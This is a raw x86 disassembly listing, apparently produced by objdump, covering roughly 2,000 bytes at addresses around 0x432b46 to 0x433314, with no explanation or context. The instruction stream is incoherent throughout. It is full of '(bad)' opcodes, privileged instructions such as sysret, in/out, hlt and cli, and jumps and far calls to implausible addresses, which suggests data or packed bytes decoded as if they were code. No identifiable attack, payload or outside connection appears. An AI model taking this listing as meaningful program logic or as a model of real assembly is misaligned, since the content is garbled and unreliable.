  432b46:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432b4c:	(bad)  
  432b4d:	mov    bh,bh
  432b4f:	jmp    0x432b3d
  432b51:	leave  
  432b52:	jne    0x432b5c
  432b54:	call   0x3024ae
  432b59:	in     al,dx
  432b5a:	dec    ebp
  432b5b:	add    dh,BYTE PTR [ebx]
  432b5d:	add    BYTE PTR [ebx],al
  432b5f:	inc    ebp
  432b60:	cmp    esi,DWORD PTR [ecx]
  432b62:	je     0x432b00
  432b64:	mov    eax,edi
  432b66:	or     al,0xf0
  432b68:	add    BYTE PTR [ebp+0x458bf845],al
  432b6e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b74:	adc    al,0x7
  432b76:	enter  0x9fc0,0xa5
  432b7a:	rol    BYTE PTR [eax],0x5e
  432b7d:	mov    ecx,ecx
  432b7f:	or     al,0xc
  432b81:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b88:	jmp    0x432b89
  432b8a:	push   ebp
  432b8b:	mov    esp,ebp
  432b8d:	cld    
  432b8e:	inc    ebp
  432b8f:	inc    ebp
  432b90:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b97:	push   esi
  432b98:	push   esi
  432b99:	mov    edi,0x7af080f
  432b9e:	add    bh,al
  432ba0:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432ba6:	add    BYTE PTR [ecx+0x4540100f],cl
  432bac:	mov    ebp,eax
  432bae:	mov    ebp,edi
  432bb0:	lock call edx
  432bb3:	fcom   DWORD PTR [ebp+0x45]
  432bb6:	mov    eax,0x148a8b
  432bbb:	push   ecx
  432bbc:	enter  0xc145,0x83
  432bc0:	cmp    ecx,DWORD PTR [eax]
  432bc2:	add    BYTE PTR [ebp+0x4d],al
  432bc5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432bcb:	call   0xffa3273a
  432bd0:	cmp    eax,DWORD PTR [ebp-0xc]
  432bd3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432bd7:	push   ebp
  432bd8:	(bad)  
  432bd9:	call   0x3429dd
  432bde:	mov    bh,0xdb
  432be0:	cld    
  432be1:	or     BYTE PTR [ebp+0x45],bl
  432be4:	(bad)  
  432be5:	call   0xff7d2875
  432bea:	add    al,BYTE PTR [ebp+0x37]
  432bed:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432bf3:	jne    0x432bf5
  432bf5:	(bad)  
  432bf6:	cmp    edi,esp
  432bf8:	jne    0x432c2b
  432bfa:	mov    edi,edi
  432bfc:	or     BYTE PTR [ebx-0x307f0b49],cl
  432c02:	pop    ds
  432c03:	into   
  432c04:	je     0x432bc7
  432c06:	mov    ebx,DWORD PTR [esi]
  432c08:	or     BYTE PTR [ebp-0x49],al
  432c0b:	mov    esp,DWORD PTR [esi-0x77]
  432c0e:	mov    esi,0x2451f0c
  432c13:	mov    eax,DWORD PTR [eax]
  432c15:	or     al,0x66
  432c17:	sar    bl,0x3b
  432c1a:	xor    esi,DWORD PTR [ebp+0x66]
  432c1d:	xor    ecx,edi
  432c1f:	pop    edi
  432c20:	adc    bl,BYTE PTR [ebx+0x7e]
  432c23:	ret    0xff
  432c26:	cld    
  432c27:	inc    ebp
  432c28:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432c2e:	cld    
  432c2f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432c36:	push   0xffffff83
  432c38:	pop    edi
  432c39:	or     BYTE PTR [ebp+0x53],dh
  432c3c:	xorps  xmm1,xmm2
  432c3f:	test   BYTE PTR [eax+eax*1],bh
  432c42:	add    BYTE PTR [eax],al
  432c44:	adc    eax,eax
  432c46:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432c4e:	jmp    DWORD PTR [eax]
  432c50:	ror    al,0x5e
  432c53:	inc    ebp
  432c54:	leave  
  432c55:	xor    ecx,DWORD PTR [eax]
  432c57:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432c5d:	add    ah,al
  432c5f:	xor    edi,edi
  432c61:	xor    DWORD PTR [ebx],0x66003302
  432c67:	mov    DWORD PTR [ebp-0xc],ecx
  432c6a:	pcmpgtw mm0,mm0
  432c6d:	add    dl,ah
  432c6f:	leave  
  432c70:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c74:	push   eax
  432c75:	dec    ebp
  432c76:	mov    esi,DWORD PTR [ebx-0x75]
  432c79:	lea    ebp,[eax-0x7c00ff02]
  432c7f:	xor    eax,DWORD PTR [eax]
  432c81:	sysret 
  432c83:	dec    ebp
  432c84:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c8b:	push   WORD PTR [ecx+0x8]
  432c8f:	jne    0x432c52
  432c91:	ud0    ecx,DWORD PTR [ecx]
  432c94:	mov    eax,edx
  432c96:	lods   al,BYTE PTR ds:[esi]
  432c97:	add    BYTE PTR [eax],al
  432c99:	data16 (bad) 
  432c9b:	iret   
  432c9c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432ca3:	cli    
  432ca4:	inc    ebp
  432ca5:	cmp    al,0x8d
  432ca7:	add    BYTE PTR [esi+0x2d],ah
  432caa:	inc    ebp
  432cab:	pop    ebp
  432cac:	lea    ecx,[edi]
  432cae:	mov    dl,bh
  432cb0:	add    BYTE PTR [edi],cl
  432cb2:	mov    DWORD PTR [eax+eax*8],edi
  432cb5:	mov    ebx,0x3b87
  432cba:	add    BYTE PTR [ebx],ch
  432cbc:	inc    ebp
  432cbd:	data16 (bad) 
  432cbf:	clc    
  432cc0:	int3   
  432cc1:	cmp    eax,DWORD PTR [eax]
  432cc3:	je     0x432c4e
  432cc5:	push   0xffffffc8
  432cc7:	pop    edi
  432cc8:	xchg   DWORD PTR [ebp+0x0],eax
  432ccb:	data16 add BYTE PTR [ebp+0x45],cl
  432ccf:	lea    cx,[ebp+0x10]
  432cd3:	jb     0x432cd5
  432cd5:	jmp    0x432c60
  432cd7:	call   eax
  432cd9:	clc    
  432cda:	xchg   DWORD PTR [edi+0x1],edi
  432cdd:	mov    eax,DWORD PTR [eax]
  432cdf:	or     BYTE PTR [ebp-0x49],al
  432ce2:	lea    eax,[eax+0x74003154]
  432ce8:	push   edi
  432ce9:	inc    edx
  432cea:	jge    0x432ceb
  432cec:	mov    DWORD PTR [edi],ecx
  432cee:	fdiv   DWORD PTR [edi-0x6]
  432cf1:	inc    DWORD PTR [eax]
  432cf3:	xor    edx,DWORD PTR [eax+0x5f]
  432cf6:	xchg   DWORD PTR [ebx+0x1],ebx
  432cf9:	ret    0x0
  432cfc:	xor    BYTE PTR [ebp-0x51],cl
  432cff:	cmp    edi,0xf0ff89fe
  432d05:	data16 ror al,0x84
  432d09:	rol    BYTE PTR [eax],0x3b
  432d0c:	add    al,dh
  432d0e:	dec    eax
  432d0f:	xchg   esp,eax
  432d10:	push   ebx
  432d11:	jmp    0x432c9e
  432d13:	push   ebp
  432d14:	add    esp,ebp
  432d16:	add    ebp,esp
  432d18:	mov    edx,DWORD PTR [edi+0x24]
  432d1b:	clc    
  432d1c:	dec    esi
  432d1d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432d23:	cmp    BYTE PTR [ebx],al
  432d25:	jne    0x432cb0
  432d27:	xor    esp,eax
  432d29:	jmp    0x462eac
  432d2e:	add    ebp,DWORD PTR [ecx+ecx*4]
  432d31:	jne    0x432d27
  432d33:	call   0xffcd2a8d
  432d38:	clc    
  432d39:	xchg   edi,eax
  432d3a:	sti    
  432d3b:	add    DWORD PTR [ebx],eax
  432d3d:	add    BYTE PTR [ebp+0x47],bl
  432d40:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432d46:	pop    ebp
  432d47:	mov    DWORD PTR [esi-0x48],esi
  432d4a:	jmp    0x432d93
  432d4c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432d52:	(bad)  
  432d54:	cmp    al,0x0
  432d56:	cmp    eax,DWORD PTR [ebp+0x18]
  432d59:	lea    ebx,[ebp-0x56]
  432d5c:	jle    0x432d5e
  432d5e:	jae    0x432ce9
  432d60:	mov    eax,esp
  432d62:	call   0xb900:0x8b005587
  432d69:	inc    ebp
  432d6a:	push   ebp
  432d6b:	lea    ecx,[ebp-0x27ff4f12]
  432d71:	mov    eax,edi
  432d73:	int3   
  432d74:	push   ebp
  432d75:	xchg   edi,eax
  432d77:	add    esp,ebp
  432d79:	add    BYTE PTR [eax],al
  432d7b:	inc    ebp
  432d7c:	add    BYTE PTR [ebp+0x8b3255],cl
  432d82:	cld    
  432d83:	mov    DWORD PTR [edx],edi
  432d85:	aam    0x75
  432d87:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d8d:	mov    DWORD PTR [ebx-0x50],edx
  432d90:	test   BYTE PTR [ebp-0x1],0xe8
  432d94:	mov    eax,DWORD PTR [eax]
  432d96:	hlt    
  432d97:	add    al,al
  432d99:	mov    eax,DWORD PTR ds:0x890045a8
  432d9f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432da5:	inc    DWORD PTR [eax*2+0xf75854d]
  432dac:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432db2:	call   0x72998af3
  432db7:	je     0x432e17
  432db9:	js     0x432e1a
  432dbb:	lock ret 0x7e
  432dbf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432dc5:	mov    edi,edi
  432dc7:	sbb    al,bl
  432dc9:	clc    
  432dca:	add    BYTE PTR [ebp-0x73],bh
  432dcd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432dd3:	ror    BYTE PTR [eax],1
  432dd5:	dec    ebp
  432dd6:	xchg   ebp,eax
  432dd7:	mov    edi,edi
  432dd9:	in     al,0x8b
  432ddb:	jge    0x432d66
  432ddd:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432de3:	clc    
  432de4:	pop    esi
  432de5:	fist   DWORD PTR [ebp+0x5d398b5d]
  432deb:	clc    
  432dec:	add    al,0x6e
  432dee:	mov    eax,DWORD PTR [ebx]
  432df0:	mov    BYTE PTR [ebp+0x0],dl
  432df3:	mov    edx,DWORD PTR [ebx-0x20]
  432df6:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432dfc:	add    eax,0x3b3b73
  432e01:	adc    al,0x89
  432e03:	pop    eax
  432e04:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432e08:	ret    0xf08
  432e0b:	cmp    al,0x2
  432e0d:	mov    edx,eax
  432e0f:	cld    
  432e10:	add    BYTE PTR [ebp+0x66],dl
  432e13:	add    eax,ebx
  432e15:	add    esp,eax
  432e17:	sub    eax,eax
  432e19:	or     BYTE PTR [ecx-0x77f474bb],cl
  432e1f:	add    BYTE PTR [eax],al
  432e21:	mov    DWORD PTR [ebx-0x24],ebx
  432e24:	push   edi
  432e25:	push   ebp
  432e26:	clc    
  432e27:	add    DWORD PTR [esi+0x1b0100],0x45
  432e2e:	out    0xff,eax
  432e30:	add    edx,DWORD PTR [eax]
  432e32:	jmp    0x432e1c
  432e34:	cmp    ch,0x46
  432e37:	(bad)  
  432e38:	jmp    0x40c8b68a
  432e3d:	je     0x432dc9
  432e3f:	mov    eax,DWORD PTR [eax-0x10c78104]
  432e45:	inc    ebp
  432e46:	add    BYTE PTR [ebx-0x770375],al
  432e4c:	add    ah,ch
  432e4e:	add    edx,esp
  432e50:	pop    edi
  432e51:	pop    ebp
  432e52:	push   ebp
  432e53:	inc    ebx
  432e54:	in     al,dx
  432e55:	pop    ebp
  432e56:	in     al,dx
  432e57:	cmp    edx,DWORD PTR [edi-0x8]
  432e5a:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432e61:	add    al,0x47
  432e63:	push   ebp
  432e64:	mov    esp,ebp
  432e66:	in     al,0x45
  432e68:	dec    ebp
  432e69:	push   esi
  432e6a:	test   DWORD PTR [eax+0xfb010f],esi
  432e70:	add    BYTE PTR [eax+0xc018b],dh
  432e76:	leave  
  432e77:	inc    ebp
  432e78:	test   al,ch
  432e7a:	add    dh,bh
  432e7c:	add    bh,bh
  432e7e:	dec    ebp
  432e7f:	push   cs
  432e80:	mov    DWORD PTR [ecx],eax
  432e82:	hlt    
  432e83:	push   es
  432e84:	dec    ebp
  432e85:	leave  
  432e86:	mov    DWORD PTR [eax],ecx
  432e88:	clc    
  432e89:	cmovge eax,ecx
  432e8c:	mov    ecx,0x85c2f0
  432e92:	clc    
  432e93:	pop    DWORD PTR [ebp+0x1]
  432e96:	push   ebx
  432e97:	add    BYTE PTR [ebp-0x15],bh
  432e9a:	push   esi
  432e9b:	xor    eax,0x898a45
  432ea0:	cld    
  432ea1:	add    al,BYTE PTR [ebp+0x0]
  432ea4:	xor    esp,DWORD PTR [esi-0x64]
  432ea7:	add    DWORD PTR [esi+0x78308c1],edi
  432ead:	add    ah,BYTE PTR [ebp-0x49]
  432eb0:	int    0xbb
  432eb2:	mov    ecx,DWORD PTR [esi+0xc]
  432eb5:	add    dh,al
  432eb7:	cmp    ecx,ebx
  432eb9:	jne    0x432e83
  432ebb:	xor    ecx,DWORD PTR [ebp+0x66]
  432ebe:	jmp    0xca2ec4
  432ec3:	add    DWORD PTR [ebp+0x0],eax
  432ec6:	mov    eax,ebx
  432ec8:	or     al,0x8b
  432eca:	(bad)  
  432ecb:	mov    ecx,esi
  432ecd:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432ed4:	mov    eax,edi
  432ed6:	or     BYTE PTR [edx],cl
  432ed8:	shl    cl,cl
  432eda:	icebp  
  432edb:	add    BYTE PTR [ebp+0x38],0x8b
  432edf:	or     BYTE PTR [edx+eax*2],cl
  432ee2:	(bad)  
  432ee3:	or     cl,dh
  432ee5:	stc    
  432ee6:	shl    DWORD PTR [ebp-0x30],0xc6
  432eea:	xor    al,0x0
  432eec:	inc    ebp
  432eed:	xchg   BYTE PTR [ebx],al
  432eef:	add    esp,edi
  432ef1:	add    BYTE PTR [ebp-0x39],cl
  432ef4:	mov    al,bl
  432ef6:	test   DWORD PTR [ebx+0x1c348375],ecx
  432efc:	sub    al,0xbf
  432efe:	jmp    0x432e85
  432f00:	mov    edi,eax
  432f02:	lock jge 0x432ef6
  432f05:	lea    esi,[edx-0x74bad5ff]
  432f0b:	mov    ebp,esp
  432f0d:	or     cl,dh
  432f0f:	leave  
  432f10:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432f17:	dec    ebp
  432f18:	dec    ebp
  432f19:	test   DWORD PTR [ebx],eax
  432f1b:	paddb  mm6,mm0
  432f1e:	add    DWORD PTR [eax],eax
  432f20:	dec    ebp
  432f21:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432f27:	mov    esi,DWORD PTR [edx]
  432f29:	or     al,0x2b
  432f2b:	dec    ebp
  432f2c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432f32:	mov    esp,edi
  432f34:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432f3b:	mov    DWORD PTR [ebx],ebp
  432f3d:	call   0xc76b86d
  432f42:	mov    DWORD PTR [ebp+0x10],ecx
  432f45:	(bad)  
  432f46:	push   0x8b85ff10
  432f4b:	clc    
  432f4c:	or     al,0x54
  432f4e:	(bad)  
  432f4f:	push   ecx
  432f50:	retf   
  432f51:	mov    ebx,0xff4d8dc8
  432f56:	mov    DWORD PTR [ebp+0x8],eax
  432f59:	xor    eax,DWORD PTR [ebp-0x75]
  432f5c:	cmp    ebp,DWORD PTR [ebx]
  432f5e:	lsl    ebx,WORD PTR [edi-0x8]
  432f62:	call   DWORD PTR [ebx-0x741bff75]
  432f68:	(bad)  
  432f69:	or     al,0x5b
  432f6b:	dec    ebp
  432f6c:	or     BYTE PTR [ebx],dh
  432f6e:	inc    ebp
  432f6f:	xor    esi,DWORD PTR ds:0x708088d
  432f75:	in     eax,0x9b
  432f77:	add    BYTE PTR [edx],dh
  432f79:	inc    ebp
  432f7a:	pop    edi
  432f7b:	xor    eax,edx
  432f7d:	test   DWORD PTR [eax],0x81108b8b
  432f83:	dec    ebp
  432f84:	sub    al,0x33
  432f86:	add    BYTE PTR [ebx],dh
  432f88:	push   esi
  432f89:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f8f:	mov    edi,eax
  432f91:	or     BYTE PTR [ebp+0x45],al
  432f94:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f9a:	xor    ecx,ecx
  432f9c:	pushf  
  432f9d:	push   es
  432f9e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432fa5:	dec    ebp
  432fa6:	inc    ebp
  432fa7:	cmp    BYTE PTR [ecx],0x54
  432faa:	pushf  
  432fab:	gs (bad) 
  432fad:	shl    esp,1
  432faf:	dec    ebp
  432fb0:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432fb6:	shr    ecx,1
  432fb8:	xlat   BYTE PTR ds:[ebx]
  432fb9:	rol    bh,cl
  432fbb:	mov    edx,esp
  432fbd:	or     BYTE PTR [ebp+0x4588f84d],al
  432fc3:	mov    ecx,DWORD PTR [eax]
  432fc5:	or     BYTE PTR [eax],al
  432fc7:	push   ebp
  432fc8:	mov    edi,DWORD PTR [eax+0xfc728b]
  432fce:	dec    ebp
  432fcf:	enter  0xceba,0x8
  432fd3:	retf   0x1807
  432fd6:	ret    0x9b4d
  432fd9:	mov    esi,DWORD PTR [edx]
  432fdb:	or     al,0x33
  432fdd:	into   
  432fde:	add    edx,esi
  432fe0:	add    ecx,edx
  432fe2:	bswap  eax
  432fe4:	ror    esi,0x98
  432fe7:	dec    ebp
  432fe8:	add    cl,ch
  432fea:	mov    edi,edi
  432fec:	hlt    
  432fed:	inc    esi
  432fef:	inc    ebp
  432ff0:	ret    0x4533
  432ff3:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ff9:	or     BYTE PTR [ebx],dh
  432ffb:	dec    ebp
  432ffc:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433002:	jne    0xff8d2fc9
  433008:	inc    ebp
  433009:	inc    ebp
  43300a:	mov    esi,DWORD PTR [ebx]
  43300c:	clc    
  43300d:	pop    esi
  43300e:	ret    0xcaeb
  433011:	mov    eax,esi
  433013:	call   0x520484e6
  433018:	dec    ebp
  433019:	add    eax,0xf8728b
  43301e:	adc    eax,0xce0ccac9
  433023:	push   ebp
  433024:	ret    0xc6ec
  433027:	in     al,dx
  433028:	call   0x33437d31
  43302d:	push   edi
  43302e:	add    edi,eax
  433030:	xor    eax,eax
  433032:	jmp    0x433079
  433034:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  43303a:	add    eax,edi
  43303c:	shr    eax,cl
  43303e:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433044:	mov    esi,DWORD PTR [edx]
  433046:	in     al,dx
  433047:	pushf  
  433048:	ret    0x84c7
  43304b:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  433051:	inc    ebp
  433052:	in     al,dx
  433053:	xor    DWORD PTR [ebp-0x64],eax
  433056:	mov    eax,edi
  433058:	cld    
  433059:	fmul   st(2),st
  43305b:	sbb    dl,al
  43305d:	jmp    0x9c3b:0x304d45c1
  433064:	jbe    0x43302d
  433066:	mov    esp,eax
  433068:	clc    
  433069:	add    BYTE PTR [ebp+0x0],cl
  43306c:	mov    ecx,ecx
  43306e:	lea    eax,[ebp-0x5]
  433071:	mov    edi,edi
  433073:	call   0x51ce84bd
  433078:	hlt    
  433079:	xor    eax,edx
  43307b:	mov    esi,0x9b7284
  433080:	xor    cl,dl
  433082:	mov    esi,eax
  433084:	hlt    
  433085:	into   
  433086:	inc    ebp
  433087:	scas   eax,DWORD PTR es:[edi]
  433088:	mov    ebp,ecx
  43308a:	cld    
  43308b:	add    dl,cl
  43308d:	add    dl,al
  43308f:	inc    ebp
  433090:	shr    DWORD PTR [ebx],0x4d
  433093:	xor    edi,DWORD PTR [ebx]
  433095:	mov    DWORD PTR [edi],ecx
  433097:	clc    
  433098:	dec    esi
  433099:	inc    ebp
  43309a:	dec    DWORD PTR [ebx-0x3d2b1775]
  4330a0:	ret    0xc6ca
  4330a3:	mov    BYTE PTR [ebp-0x32],0x53
  4330a7:	scas   eax,DWORD PTR es:[edi]
  4330a8:	inc    ebp
  4330a9:	jmp    0x4330db
  4330ab:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  4330b2:	pop    ebx
  4330b3:	xor    ecx,DWORD PTR [ebp+0x3]
  4330b6:	mov    eax,DWORD PTR [ebx]
  4330b8:	clc    
  4330b9:	test   edx,ecx
  4330bb:	mov    ecx,esi
  4330bd:	cld    
  4330be:	call   0x8ab77608
  4330c3:	xor    ecx,DWORD PTR [eax+0x4533f303]
  4330c9:	add    ecx,DWORD PTR [ebx-0x4974072d]
  4330cf:	fdiv   QWORD PTR [ebx]
  4330d1:	retf   0xce89
  4330d4:	in     al,0xc1
  4330d6:	inc    ebp
  4330d7:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  4330dd:	into   
  4330de:	mov    dh,0xc1
  4330e1:	call   0x8c17766a
  4330e6:	(bad)  
  4330e7:	cld    
  4330e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4330eb:	xor    eax,ecx
  4330ed:	lea    eax,[ebp+0x8]
  4330f0:	mov    esi,DWORD PTR [edx-0x4]
  4330f3:	add    dl,al
  4330f5:	inc    ebp
  4330f6:	mov    esp,0x32d89b8b
  4330fb:	dec    ebp
  4330fc:	mov    esi,DWORD PTR [ebx]
  4330fe:	cld    
  4330ff:	xor    eax,edx
  433101:	sub    esp,DWORD PTR [ebp-0x75]
  433104:	int    0xec
  433106:	sub    ecx,eax
  433108:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43310e:	mov    esi,esp
  433110:	call   0x34177e99
  433115:	inc    DWORD PTR [ebx]
  433117:	mov    edi,DWORD PTR [ebx]
  433119:	cld    
  43311a:	jne    0x433169
  43311c:	mov    esi,DWORD PTR [ebx]
  43311e:	aam    0x8d
  433120:	dec    ebp
  433121:	or     BYTE PTR [ebx],dh
  433123:	jb     0x433128
  433125:	add    BYTE PTR [edi+0x45],bl
  433128:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  43312f:	xor    ebp,esp
  433131:	xor    eax,edi
  433133:	sub    edi,esp
  433135:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  43313b:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433142:	inc    ebp
  433143:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433149:	clc    
  43314a:	mov    eax,edi
  43314c:	nop
  43314d:	fadd   QWORD PTR [eax]
  43314f:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433155:	jmp    0x4330e0
  433157:	mov    eax,DWORD PTR [ecx]
  433159:	fadd   DWORD PTR [eax]
  43315b:	inc    ebp
  43315c:	or     DWORD PTR [ebx],esi
  43315e:	dec    eax
  43315f:	add    edx,DWORD PTR [ebx-0x2d]
  433162:	dec    ebp
  433163:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433169:	inc    ebp
  43316a:	push   esp
  43316b:	mov    dl,BYTE PTR [ecx-0xd]
  43316e:	xor    ecx,DWORD PTR [ebp-0x45]
  433171:	(bad)  
  433173:	rol    BYTE PTR [eax],0xc1
  433176:	ret    
  433177:	inc    ebp
  433178:	inc    ebp
  433179:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  43317f:	xor    eax,ebx
  433181:	add    eax,DWORD PTR [ebp+0x23]
  433184:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43318a:	cmp    edi,0xc
  43318d:	dec    ebp
  43318e:	inc    ebp
  43318f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433195:	inc    ebp
  433196:	mov    esi,DWORD PTR [ebx]
  433198:	clc    
  433199:	lea    eax,[ebp+0x45725407]
  43319f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  4331a3:	xor    edi,DWORD PTR [eax]
  4331a5:	mov    ecx,0xff8b8d4d
  4331aa:	push   esp
  4331ab:	enter  0x4df7,0x23
  4331af:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  4331b5:	mov    eax,DWORD PTR [ebx]
  4331b7:	loopne 0x4331a4
  4331b9:	ret    0xc68b
  4331bc:	push   esp
  4331bd:	enter  0x9745,0x8b
  4331c1:	inc    ebp
  4331c2:	cld    
  4331c3:	mov    eax,edi
  4331c5:	clc    
  4331c6:	ret    
  4331c7:	ret    0xc645
  4331ca:	mov    esi,DWORD PTR [ebx]
  4331cc:	cld    
  4331cd:	pop    esi
  4331ce:	mov    ebx,0x83458bc3
  4331d4:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4331d8:	dec    ebp
  4331d9:	xor    DWORD PTR [ebx],esi
  4331db:	pushf  
  4331dc:	add    edi,DWORD PTR [edx-0x7767a77]
  4331e2:	fcom   DWORD PTR [ebp+0x45]
  4331e5:	mov    esi,DWORD PTR [ebx]
  4331e7:	adc    al,0x9c
  4331e9:	inc    ebp
  4331ea:	(bad)  
  4331eb:	mov    ebx,eax
  4331ed:	adc    al,0x85
  4331ef:	cmp    al,0x1
  4331f2:	inc    ebp
  4331f3:	add    BYTE PTR ds:0xe98b9c4d,bh
  4331f9:	mov    eax,DWORD PTR [ebx]
  4331fb:	nop
  4331fc:	add    BYTE PTR [eax],al
  4331fe:	inc    ebp
  4331ff:	mov    esi,DWORD PTR [ebx]
  433201:	add    eax,DWORD PTR [ebx]
  433203:	cmp    al,0x89
  433205:	mov    esp,esi
  433207:	clc    
  433208:	inc    ebp
  433209:	inc    ebp
  43320a:	add    edx,DWORD PTR [esi+0xc]
  43320d:	mov    edi,0x7ff0845
  433212:	in     al,dx
  433213:	(bad)  
  433214:	jne    0x4331b1
  433216:	mov    esi,DWORD PTR [edx]
  433218:	clc    
  433219:	add    ebp,DWORD PTR [esi]
  43321b:	mov    edi,edi
  43321d:	in     al,dx
  43321e:	mov    DWORD PTR [ebp-0x10],eax
  433221:	xor    eax,DWORD PTR [ebp+0x3]
  433224:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  43322a:	fmul   DWORD PTR [ebx-0x173caf39]
  433230:	lea    ecx,[ecx+0x45e8d4bc]
  433236:	clc    
  433237:	mov    edi,edi
  433239:	cmp    BYTE PTR [ebp+0x4d],al
  43323c:	test   DWORD PTR [eax+0x74],ecx
  43323f:	inc    ecx
  433240:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433246:	ret    
  433247:	inc    eax
  433248:	dec    DWORD PTR [ebx+0x4945f8f0]
  43324e:	push   eax
  43324f:	dec    eax
  433250:	test   al,0xd0
  433252:	dec    eax
  433254:	mov    eax,DWORD PTR [ebp-0x14]
  433257:	mov    eax,DWORD PTR [ebp+0x38]
  43325a:	mov    eax,ecx
  43325c:	fadd   DWORD PTR [ebx]
  43325e:	dec    ebp
  43325f:	inc    eax
  433260:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433266:	inc    ebp
  433267:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  43326d:	fadd   QWORD PTR [ebx]
  43326f:	inc    ebp
  433270:	or     al,0x33
  433272:	dec    ebp
  433273:	add    edi,DWORD PTR [ebx]
  433275:	mov    DWORD PTR [edx-0x28],esi
  433278:	mov    eax,DWORD PTR [ebp-0x10]
  43327b:	mov    eax,DWORD PTR [eax+0x10]
  43327e:	mov    eax,edi
  433280:	lock ret 
  433282:	inc    ecx
  433283:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433289:	fsubr  st,st(5)
  43328b:	test   DWORD PTR [eax],eax
  43328d:	clc    
  43328e:	push   0x45
  433290:	(bad)  
  433291:	cmp    al,0xec
  433293:	pushf  
  433294:	inc    ebp
  433295:	(bad)  
  433296:	push   eax
  433297:	fsub   DWORD PTR [eax-0x7b]
  43329a:	(bad)  
  43329b:	clc    
  43329c:	mov    eax,0xf8008584
  4332a1:	mov    eax,DWORD PTR [ebp-0x4]
  4332a4:	mov    edi,0x4585c3cc
  4332aa:	clc    
  4332ab:	mov    eax,DWORD PTR [ebp+0x14]
  4332ae:	xor    eax,DWORD PTR [ebp-0x64]
  4332b1:	mov    edi,eax
  4332b3:	in     al,dx
  4332b4:	les    esi,FWORD PTR [ebp-0x7b]
  4332b7:	mov    edi,eax
  4332b9:	or     al,0x4d
  4332bb:	dec    ebp
  4332bc:	mov    eax,ebp
  4332be:	in     al,0xf2
  4332c0:	dec    ebp
  4332c1:	dec    DWORD PTR [ecx+0x4dc7e045]
  4332c7:	fmul   DWORD PTR [ecx+0x4df8f085]
  4332cd:	inc    ebp
  4332ce:	mov    DWORD PTR [ebx],esi
  4332d0:	fadd   QWORD PTR [ebx]
  4332d2:	dec    ebp
  4332d3:	push   eax
  4332d4:	xor    eax,DWORD PTR [ebp+0x3]
  4332d7:	push   eax
  4332d8:	mov    DWORD PTR [eax+ebx*8],ebx
  4332db:	push   esi
  4332dd:	mov    eax,DWORD PTR [eax]
  4332df:	lock cmp eax,0xf84e85c0
  4332e5:	inc    ebp
  4332e6:	test   BYTE PTR [ebx],dh
  4332e8:	add    DWORD PTR [ebx],eax
  4332ea:	add    BYTE PTR [eax+0x4d],dl
  4332ed:	jne    0x433322
  4332ef:	lea    ecx,[ebx-0x7617fc44]
  4332f5:	div    ah
  4332f7:	inc    DWORD PTR [ebp+0x45]
  4332fa:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433300:	jb     0x43328d
  433302:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433309:	mov    ecx,DWORD PTR [ebp-0x10]
  43330c:	xor    ecx,DWORD PTR [ebp+0x3]
  43330f:	mov    edi,DWORD PTR [ebx]
  433311:	adc    BYTE PTR [ebp+0x41],dh
  433314:	mov    ecx,DWORD PTR [ebx-0x37382704]
